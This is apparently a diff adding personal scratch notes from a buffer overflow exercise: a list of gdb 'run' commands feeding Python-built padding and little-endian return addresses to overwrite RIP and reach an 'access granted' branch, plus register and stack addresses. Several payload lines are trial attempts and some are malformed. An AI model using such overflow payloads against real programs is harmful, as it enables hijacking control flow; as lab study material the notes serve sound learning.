@@ -1,0 +1,56 @@
+Promising:
+
+MOST PROMISING - GETS INTO RIP 
+run $(python -c "print('\x90'*24+'\xea\x1a\xfe\xff\xff\xff\xff\xff')")
+
+run $(python -c "print('A'*16+'BBBBBBBB')")
+
+-gets command into rbp register when you seg fault.
+run $(python -c "print('A'*16+'\xe8\x0e\xfe\xff\xff\xff\xff\xff')")
+run $(python -c "print('\x90'*16+'\xe8\x0e\xfe\xff\xff\xff\xff\xff')")
+
+
+
+run $(python -c "print('A'*30)") - actually gets 41414114141 printed...?
+run $(python -c "print('A'*24 + '\xfe\xff\xff\xff\xff\xff')")
+
+run $(python -c "print('A'*16+'\x00\x00\x00\x00\x00\xcd\x06\x40')")
+run $(python -c "print('\x90'*21+'\xcd\x06\x40')")
+00000000004006cd
+
+
+
+\xe8\x0e\xfe\xff\xff\xff\xff\xff
+fffffffffffe0ee8
+
+run $(python -c "print(b'\x90'*12+b'\xba\x06\x40')")
+run $(python -c "print(b'\x90'*9+b'\xc0\xdd\xfe\xff\xff\x7f')")
+
+run $(python -c "print('A'*12+'\xe0\x06\x40')")
+run $(python -c "print('A'*12+4006e7)")
+run $(python -c "print('A'*300)")
+run $(python -c "print('A'*9+'\xc0\xdd\xfe\xff\xff\x7f')")
+run $(python2 -c print"('A'*200+'\x3d\x13\x40')")
+#4006f2
+
+register infos
+info reg
+
+
+access granted?
+4006cd (one of the puts?)
+
+
+#\xc0\xdd\xfe\xff\xff\x7f
+7ffffffeddd0
+#b *0x4006bb
+# x/200xb $rsp
+
+# 0x7ffffffedd90 where the buffer is
+
+
+# 0x00007fffff3ec760 where buffer overflow caused seg fault
+
+# memory starts at 31/(or 30)
+
+# Leave the code below in place
